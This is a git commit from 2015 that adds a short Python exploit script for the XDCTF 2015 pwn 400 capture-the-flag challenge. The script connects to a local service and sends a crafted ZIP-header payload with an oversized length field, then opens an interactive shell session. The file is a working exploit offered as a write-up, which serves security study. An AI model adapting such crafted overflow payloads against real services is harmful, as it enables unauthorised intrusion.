a948aecc20923d42ad2f3fcc5494a4256c6a7172
pxx199181 <420064976@qq.com>
2015-10-03 03:52:22 -0700

    2015-10-3

---
+++ write-ups/2015-xdctf/pwn/400/pwn400.py
@@ -0,0 +1,19 @@
+from zio import *
+from pwn import *
+context(arch = 'i386', os = 'linux')
+
+target = ("127.0.0.1", 8888)
+def get_io(target):
+	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
+	return io
+
+def pwn(io):
+
+	file_len = l16(0xffff)
+	pk_sign = "PK\x01\x02"
+	payload = pk_sign + 'a' * 24 + file_len + 'a' * 47
+	io.write(payload)
+	io.interact()
+
+io = get_io(target)
+pwn(io)
